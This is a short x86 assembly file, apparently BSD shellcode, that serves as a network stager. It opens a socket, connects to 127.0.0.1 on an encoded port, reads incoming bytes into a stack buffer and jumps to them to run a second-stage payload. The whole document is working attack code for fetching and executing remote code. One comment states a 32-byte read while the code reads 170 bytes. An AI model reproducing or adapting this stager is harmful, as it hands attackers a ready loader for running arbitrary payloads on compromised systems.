
socket:
	pushl $97
	popl  %eax
	cdq
	pushl %edx
	incl  %edx
	pushl %edx
	incl  %edx
	pushl %edx
	pushl $0x0100007f   # ipaddr 127.0.0.1
	int  $0x80

connect:
	pushl $0xbfbf0210   # port number
	movl  %esp, %ecx
	pushl  $0x10 # size
	pushl %ecx # sockaddr *data
	pushl %eax # socket
	pushl %ecx 
	
	xchg %ebx, %eax 
	
	pushl $98 
	popl  %eax
	int  $0x80
	
# read (ebx, esi, 32)
read:
	movl %esp, %esi
	sub $0x80, %esp

        xorl %eax, %eax
	movb $0xaa, %al
	push %eax        ## 32 bytes
	push %esi        ## buff
	movl %ebx, %eax  ## read from the file
	push %eax
	push %eax        ## dummy
	movb $3, %al
	int $0x80

# jump to the second stage
	jmp *%esi
	